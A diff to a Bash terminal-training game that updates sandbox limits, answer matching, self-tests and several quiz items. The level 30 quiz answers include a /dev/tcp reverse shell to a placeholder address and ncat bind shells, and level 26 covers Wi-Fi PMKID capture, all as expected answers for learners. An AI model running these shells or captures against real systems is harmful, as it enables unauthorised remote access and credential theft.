@@ -62,7 +62,7 @@ _strip_ansi() {
   REPLY="$out"
 }
 
-VERSION="1.2.5"
+VERSION="1.2.6"
 SANDBOX_TIMEOUT=5      # Seconds before sandbox command times out
 BOSS_THRESHOLD=4       # Correct answers needed to beat boss (out of BOSS_TOTAL)
 BOSS_TOTAL=5           # Number of questions in boss round
@@ -501,7 +501,7 @@ _sandbox_init() {
   ((SANDBOX_MODE)) || return 0
   _check_bwrap || return 1
   # Check available disk space (need at least 10MB)
-  local _avail; _avail=$(df -k "${DATA%/*}" 2>/dev/null | awk 'NR==2{print $4}')
+  local _avail; _avail=$(df -kP "${DATA%/*}" 2>/dev/null | awk 'NR==2{print $4}')
   if [[ -n "$_avail" ]] && ((_avail < 10240)); then
     printf '%s\n' "${Y}Warning: low disk space, sandbox disabled${N}" >&2
     SANDBOX_MODE=0; return 1
@@ -562,7 +562,8 @@ _sandbox_exec() {
   local _rc
   # ulimit -u caps processes inside the sandbox so a fork bomb can't pin a core
   # for the full timeout window. 256 is far above anything a real lesson needs.
-  timeout "$timeout_sec" bwrap "${bwrap_args[@]}" /bin/bash -c 'ulimit -u 256 2>/dev/null; eval "$1"' -- "$cmd"; _rc=$?
+  # ulimit -f caps file size (64MB) so dd/yes into /sandbox can't fill the real disk in the timeout window
+  timeout "$timeout_sec" bwrap "${bwrap_args[@]}" /bin/bash -c 'ulimit -u 256 2>/dev/null; ulimit -f 65536 2>/dev/null; eval "$1"' -- "$cmd"; _rc=$?
   ((_rc >= 125)) && printf '%s\n' "${R}sandbox error (exit ${_rc})${N}" >&2
   return "$_rc"
 }
@@ -1645,7 +1646,7 @@ gen_level11() {
   questions+=("Run ${W}${script}${C} > ${W}${outfile}${C} in background, sleep 1, then grep '${term}' in ${W}${outfile}${C}§./${script} > ${outfile} & sleep 1 && grep ${term} ${outfile}")
   questions+=("Tail ${W}${log}${C} in background|tail -f ${log} &|tail --follow ${log} &|tail -F ${log} &")
   questions+=("Grep ${Y}${term}${C} from ${W}${log}${C} in background, save to ${W}matches.txt${C}|grep ${term} ${log} > matches.txt &|rg ${term} ${log} > matches.txt &")
-  questions+=("Disown job ${n2} (detach from shell)|disown %${n2}|disown -h %${n2}")
+  questions+=("Disown job ${n2} (detach from shell)|disown %${n2}")
   questions+=("Wait for job ${n2} specifically|wait %${n2}")
   questions+=("Bring most recent job to foreground|fg|fg %%|fg %+|fg %")
   questions+=("Continue stopped job in background|bg|bg %%|bg %+|bg %")
@@ -1947,7 +1948,7 @@ gen_level17() {
   questions+=("Find files modified after 2025-01-01 (-newermt)|find . -newermt '2025-01-01' -type f|find . -type f -newermt '2025-01-01'|find . -newermt 2025-01-01 -type f")
   questions+=("Show file size in bytes for ${W}${txt}${C}|stat -c '%s' ${txt}|stat --printf='%s\\n' ${txt}|stat --format='%s' ${txt}|wc -c < ${txt}")
   questions+=("Resolve canonical absolute path of ${W}${txt}${C}|realpath ${txt}|readlink -f ${txt}|readlink --canonicalize ${txt}|realpath -e ${txt}")
-  questions+=("Locate ${W}${proc}${C} command (POSIX-portable; sees builtins+aliases)|command -v ${proc}|type ${proc}|type -p ${proc}|which ${proc}|whereis ${proc}")
+  questions+=("Locate ${W}${proc}${C} command|command -v ${proc}|type ${proc}|type -p ${proc}|which ${proc}|whereis ${proc}")
 }
 
 # Level 18: Data Processing
@@ -2521,7 +2522,7 @@ gen_level26() {
   questions+=("Clientless PMKID-only capture from ${W}${mac}${C} on ${W}${wiface}mon${C}|hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} --filtermode=2 -o pmkid.pcapng|sudo hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} --filtermode=2 -o pmkid.pcapng|hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} -o pmkid.pcapng|sudo hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} -o pmkid.pcapng#boss-skip")
   questions+=("Wireshark/tshark filter: only EAPOL frames in ${W}${pcap}${C}|tshark -r ${pcap} -Y eapol|tshark -r ${pcap} -Y 'eapol'|tshark -r ${pcap} -Y eapol -w eapol.pcapng#boss-skip")
   questions+=("Wireshark/tshark filter: beacon frames (subtype 8) in ${W}${pcap}${C}|tshark -r ${pcap} -Y 'wlan.fc.type_subtype == 8'|tshark -r ${pcap} -Y 'wlan.fc.type_subtype==8'")
-  questions+=("Channel-hop scan on ${W}${wiface}mon${C} across all bands (a/b/g)|airodump-ng --band abg ${wiface}mon|sudo airodump-ng --band abg ${wiface}mon|airodump-ng -C 1,6,11,36,40,44,48 ${wiface}mon|sudo airodump-ng -C 1,6,11,36,40,44,48 ${wiface}mon#boss-skip")
+  questions+=("Channel-hop scan on ${W}${wiface}mon${C} across all bands (a/b/g)|airodump-ng --band abg ${wiface}mon|sudo airodump-ng --band abg ${wiface}mon|airodump-ng --channel 1,6,11,36,40,44,48 ${wiface}mon|sudo airodump-ng --channel 1,6,11,36,40,44,48 ${wiface}mon#boss-skip")
   questions+=("Show wireless interfaces (modern)|iw dev|sudo iw dev")
   questions+=("Scan for nearby APs on ${W}${wiface}${C}|iw dev ${wiface} scan|sudo iw dev ${wiface} scan|nmcli dev wifi list|nmcli device wifi list|iwlist ${wiface} scan|sudo iwlist ${wiface} scan")
   questions+=("Show connected WiFi info on ${W}${wiface}${C}|iw dev ${wiface} link|sudo iw dev ${wiface} link|iwconfig ${wiface}|sudo iwconfig ${wiface}")
@@ -2753,7 +2754,7 @@ gen_level30() {
   questions+=("Emergency disk cleanup: delete /var/log .gz files older than 7 days|find /var/log -name '*.gz' -mtime +7 -delete|find /var/log -name '*.gz' -mtime +7 -exec rm {} +|find /var/log -name '*.gz' -mtime +7 -exec rm {} \;")
   questions+=("Find recently modified system files|find /etc -mmin -60 -type f 2>/dev/null|find /etc -type f -mmin -60 2>/dev/null")
   questions+=("From ${W}ss -tlpn${C} output, print local address (col 4) and process (col 6)§ss -tlpn | awk 'NR>1 {print \$4, \$6}'§ss -tlpn | awk 'NR>1{print \$4,\$6}'§ss -tlpn | tail -n +2 | awk '{print \$4, \$6}'§ss -tlpn | tail -n +2 | awk '{print \$4,\$6}'")
-  questions+=("Reverse shell (bash) to ${W}${ip}:${port}${C}|bash -i >& /dev/tcp/${ip}/${port} 0>&1|/bin/bash -i >& /dev/tcp/${ip}/${port} 0>&1")
+  questions+=("Reverse shell (bash, pentest) to ${W}${ip}:${port}${C}|bash -i >& /dev/tcp/${ip}/${port} 0>&1|/bin/bash -i >& /dev/tcp/${ip}/${port} 0>&1")
   questions+=("Create SSH tunnel to ${W}${user}@${host}${C} (local ${port} -> remote ${port}), background it|ssh -fNT -L ${port}:localhost:${port} ${user}@${host}|ssh -fN -L ${port}:localhost:${port} ${user}@${host}|ssh -fNTL ${port}:localhost:${port} ${user}@${host}|ssh -fNL ${port}:localhost:${port} ${user}@${host}|ssh -L ${port}:localhost:${port} -fNT ${user}@${host}|ssh -L ${port}:localhost:${port} -fN ${user}@${host}")
   questions+=("Test if ${W}${ip}${C} is up via port 22 (no ping)|timeout 1 bash -c \"echo >/dev/tcp/${ip}/22\" && echo up|nc -zw1 ${ip} 22|nc -z -w 1 ${ip} 22|nc -zw 1 ${ip} 22")
   questions+=("Bind shell with ncat on port ${W}${port}${C}|ncat -lvnp ${port} -e /bin/bash|ncat -nlvp ${port} -e /bin/bash|ncat -lvnp ${port} -e /bin/sh|ncat -nlvp ${port} -e /bin/sh|ncat -lvnp ${port} -e bash|ncat -nlvp ${port} -e bash|ncat -lvnp ${port} -e sh|ncat -nlvp ${port} -e sh|nc -lvnp ${port} -e /bin/bash|nc -nlvp ${port} -e /bin/bash|nc -lvnp ${port} -e /bin/sh|nc -nlvp ${port} -e /bin/sh")
@@ -2774,7 +2775,7 @@ gen_level30() {
   questions+=("Rate limit SSH connections|iptables -A INPUT -p tcp --dport 22 -m connlimit --connlimit-above 3 -j DROP|sudo iptables -A INPUT -p tcp --dport 22 -m connlimit --connlimit-above 3 -j DROP")
   questions+=("Enable SYN cookies|echo 1 > /proc/sys/net/ipv4/tcp_syncookies|sysctl -w net.ipv4.tcp_syncookies=1|sysctl net.ipv4.tcp_syncookies=1|sudo sysctl -w net.ipv4.tcp_syncookies=1|sudo sysctl net.ipv4.tcp_syncookies=1")
   questions+=("Disable IP forwarding|echo 0 > /proc/sys/net/ipv4/ip_forward|sysctl -w net.ipv4.ip_forward=0|sysctl net.ipv4.ip_forward=0|sudo sysctl -w net.ipv4.ip_forward=0|sudo sysctl net.ipv4.ip_forward=0")
-  questions+=("Flush all firewall rules|iptables -F; iptables -X|iptables -F && iptables -X|sudo iptables -F; sudo iptables -X|sudo iptables -F && sudo iptables -X")
+  questions+=("Flush all firewall rules (opens all ports)|iptables -F; iptables -X|iptables -F && iptables -X|sudo iptables -F; sudo iptables -X|sudo iptables -F && sudo iptables -X")
   questions+=("List all iptables rules|iptables -L -n -v|iptables -S|iptables --list -n -v|sudo iptables -L -n -v|sudo iptables -S|sudo iptables --list -n -v")
   questions+=("List all nftables rules|nft list ruleset|sudo nft list ruleset")
   questions+=("Audit failed sudo attempts|grep 'FAILED' /var/log/auth.log|grep -i 'failed' /var/log/auth.log|sudo grep 'FAILED' /var/log/auth.log|sudo grep -i 'failed' /var/log/auth.log|journalctl -u sudo|journalctl _COMM=sudo|sudo journalctl -u sudo|sudo journalctl _COMM=sudo")
@@ -3172,11 +3173,15 @@ _fnorm() {
   # Preprocess: split on ; boundaries (cmd; cmd2 → cmd ; cmd2)
   local _semi=() _sp
   for _sp in "${parts[@]}"; do
-    if [[ "$_sp" == *';'* && "$_sp" != ';' ]]; then
-      local _pre="${_sp%%;*}" _post="${_sp#*;}"
-      [[ -n "$_pre" ]] && _semi+=("$_pre")
-      _semi+=(";")
-      [[ -n "$_post" ]] && _semi+=("$_post")
+    if [[ "$_sp" == *';'* && "$_sp" != ';' && "$_sp" != '\;' ]]; then
+      # split every ; in the token (a;b;c → a ; b ; c); leave find's \; terminator intact
+      while [[ "$_sp" == *';'* ]]; do
+        local _pre="${_sp%%;*}"
+        [[ -n "$_pre" ]] && _semi+=("$_pre")
+        _semi+=(";")
+        _sp="${_sp#*;}"
+      done
+      [[ -n "$_sp" ]] && _semi+=("$_sp")
     else _semi+=("$_sp"); fi
   done
   parts=("${_semi[@]}")
@@ -3357,6 +3362,7 @@ check() {
   _trim "$1"; local inp=$REPLY; _fnorm "$inp"; local ninp=$REPLY
   _SANDBOX_REQUIRE_FAIL=0
   ((SANDBOX_MODE && !_qtext)) && _sandbox_validate "$inp" && return 0
+  [[ -n "${_qrequire:-}" && "$inp" != *"${_qrequire}"* ]] && return 1
   _text_match "$inp" "$ninp" "$2" "$_qdelim"
 }
 
@@ -4433,6 +4439,8 @@ _selftest() {
     $'dashdash\tgrep -- -v file\tgrep -- -v file'
     $'semicolon\tcmd1; cmd2\tcmd1 ; cmd2'
     $'semicolon glued\tcmd1;cmd2\tcmd1 ; cmd2'
+    $'semicolon triple glued\ta;b;c\ta ; b ; c'
+    $'find exec semi intact\tfind . -exec rm {} \\;\tfind -c -e -e -x . rm {} \\;'
     $'empty\t\t'
     $'double pipe\tcmd1 || cmd2\tcmd1 || cmd2'
     $'complex\tgrep -rn \'TODO\' ./src\tgrep -n -r TODO src'
@@ -4849,6 +4857,7 @@ place() {
   for ((lv=1; lv<=MAX_LEVEL; lv++)); do
     qi_ok=0
     for ((qi=1; qi<=2; qi++)); do
+      _preq_reset
       _pick_q "$lv" challenge || break 2
       local prompt=$_qprompt ans=$_qans
       _REDRAW_HDR() {
@@ -4882,7 +4891,7 @@ place() {
   local placed=$((lv - 1))
   ((qi_ok >= 2 && lv > MAX_LEVEL)) && placed=$MAX_LEVEL
   ((placed > BOSS_BEATEN)) && BOSS_BEATEN=$placed
-  ((placed > 0)) && PLACED_THROUGH=$placed
+  ((placed > PLACED_THROUGH)) && PLACED_THROUGH=$placed
   _save_profile
   LVL=$((placed >= MAX_LEVEL ? MAX_LEVEL : placed + 1)); QI=0; save
   printf '%s\e[2J\e[H%s\n' "$_SY" "${G}${B}═══ PLACEMENT COMPLETE ═══${N}"
